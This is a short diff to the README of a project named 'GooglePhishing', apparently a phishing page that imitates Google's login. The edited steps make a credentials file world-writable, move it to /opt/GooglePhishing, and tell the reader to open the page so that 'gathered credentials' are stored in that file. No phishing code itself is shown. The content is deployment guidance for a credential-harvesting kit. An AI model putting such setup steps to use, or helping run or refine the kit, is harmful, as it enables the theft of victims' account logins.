@@ -24,10 +24,10 @@ cd GooglePhishing
 ```
 chmod 666 creds.txt
 ```
-Move the credentials file into the non-public <b>/var/www</b> folder:
+Move the credentials file into a non-public folder:
 ```
-mv creds.txt ../../creds.txt
+mkdir /opt/GooglePhishing && mv creds.txt /opt/GooglePhishing/creds.txt
 ```
 
-Then visit <b>/GooglePhishing/index.html</b> in your browser and give it a try! Any gathered credentials will be stored in <b>/var/www/creds.txt</b>
+Then visit <b>/GooglePhishing/index.html</b> in your browser and give it a try! Any gathered credentials will be stored in <b>/opt/GooglePhishing/creds.txt</b>
 
